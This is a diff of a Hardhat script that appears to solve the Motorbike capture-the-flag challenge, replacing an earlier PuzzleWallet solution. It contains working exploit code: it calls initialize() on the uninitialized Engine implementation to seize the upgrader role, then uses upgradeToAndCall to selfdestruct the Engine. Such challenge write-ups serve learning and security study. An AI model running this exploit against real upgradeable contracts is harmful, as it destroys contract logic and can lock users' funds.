@@ -33,6 +33,9 @@ async function main() {
   // Creating an instance of the deployed Motorbike contract
   this.motorbikeContract = await hre.ethers.getContractAt("Motorbike",MotorbikeContractAddress);
 
+  // Creating an instance of the deployed Engine contract
+  this.engineContract = await hre.ethers.getContractAt("Engine",EngineContractAddress);
+
   // Creating an instance of the deployed Motorbike contract using the logic of the Engine contract
   this.engineContractProxyInstance = await hre.ethers.getContractAt("Engine",MotorbikeContractAddress);
 
@@ -42,36 +45,77 @@ async function main() {
     MotorbikeContractAddress ${MotorbikeContractAddress} \n
     EngineContractAddress ${EngineContractAddress} \n\n
     
-    upgrader:  ${await this.engineContractProxyInstance.upgrader()} \n
-    horsePower: ${await this.engineContractProxyInstance.horsePower()}
+    upgrader - PROXY:  ${await this.engineContractProxyInstance.upgrader()} \n
+    horsePower - PROXY: ${await this.engineContractProxyInstance.horsePower()} \n
+
+    upgrader - ENGINE:  ${await this.engineContract.upgrader()} \n
+    horsePower - ENGINE: ${await this.engineContract.horsePower()} \n
+
+    StorageAt slot0: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
+    StorageAt slot1: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)}
     `
   );
 
 
-  /*
+  
   console.log("\n\n Performing attack ... \n\n");
 
-  // console.log("Deploying the Attack contract");
-  // const AttackPuzzleWallet = await hre.ethers.getContractFactory("AttackPuzzleWallet");
-  // this.attackPuzzleWallet = await AttackPuzzleWallet.connect(player).deploy(ProxyContractAddress);
-  // await this.attackPuzzleWallet.deployed();
+        // initializer() can't be called directly from an EOA //
+  // console.log("Calling initializer() directly from the Player's account!");
+  // tx = await this.engineContractProxyInstance.connect(player).initialize();
+  // txReceipt = await tx.wait();
+  // console.log(txReceipt);
+  
+  
+  // Calling the inialize() of the Engine contract - Interacting directly with the Engine contract
+  tx = await this.engineContract.connect(player).initialize();
+  await tx.wait();
+  
+  
+  console.log(
+    `
+    MotorbikeContractAddress ${MotorbikeContractAddress} \n
+    EngineContractAddress ${EngineContractAddress} \n\n
 
-  console.log("Gainning ownership of the PuzzleWallet contract!");
-  tx = await this.puzzleProxy.connect(player).proposeNewAdmin(player.address);
+    StorageAt slot0 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
+    StorageAt slot1 on the Proxy contract: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)}
+    
+    StorageAt slot0 on the Engine contract: ${await hre.ethers.provider.getStorageAt(EngineContractAddress,0)}
+    `
+  );
+    
+  console.log("Checking the upgrader variable was set as the Player's address");
+  console.log("upgrader on the Engine contract: ", await this.engineContract.upgrader());
+  console.log("upgrader on the Proxy contract: ", await this.engineContractProxyInstance.upgrader());
+  //txReceipt = await tx.wait();
+  // console.log(txReceipt);
+
+  console.log("Deploying the Attack contract");
+  const AttackMotorbike = await hre.ethers.getContractFactory("AttackMotorbike");
+  this.attackMotorbike = await AttackMotorbike.connect(player).deploy();
+  await this.attackMotorbike.deployed();
+
+  const iface = new hre.ethers.utils.Interface([
+    "function destroyContract()"
+  ]);
+
+  // Encoding the data that will be sent on the upgradeToAndCall
+  const destroyContractEncoded = iface.encodeFunctionData("destroyContract",[]);
+  
+  console.log("Selfdestructing the Engine contract");
+  tx = await this.engineContract.connect(player).upgradeToAndCall(this.attackMotorbike.address,destroyContractEncoded);
   txReceipt = await tx.wait();
   // console.log(txReceipt);
 
-  console.log("Adding Player to the Whitelist on the PuzzleWallet");
-  tx = await this.puzzleProxyInstance.connect(player).addToWhitelist(player.address);
-  txReceipt = await tx.wait();
-  // console.log(txReceipt);
+  console.log("Was the Engine contract destructed?");
+  tx = await this.attackMotorbike.connect(player).contractExists(EngineContractAddress);
+  await tx.wait()
 
-  console.log("Was the player added to the whitelist?");
-  console.log(await this.puzzleProxyInstance.whitelisted(player.address));
+  console.log(await this.attackMotorbike.destroyed());
+  expect(await this.attackMotorbike.destroyed()).to.eq(true);
+  
 
-  expect(await this.puzzleProxyInstance.whitelisted(player.address)).to.eq(true);
-
-  console.log("Player is now the PuzzleWallet's owner and has been added to the whitelist!");
+  /*
 
   console.log("Starting phase 2 to become the Admin of the PuzzleProxy contract!");
   console.log("Encoding the data that will be sent to the multicall() function to alter the Player's balance!");
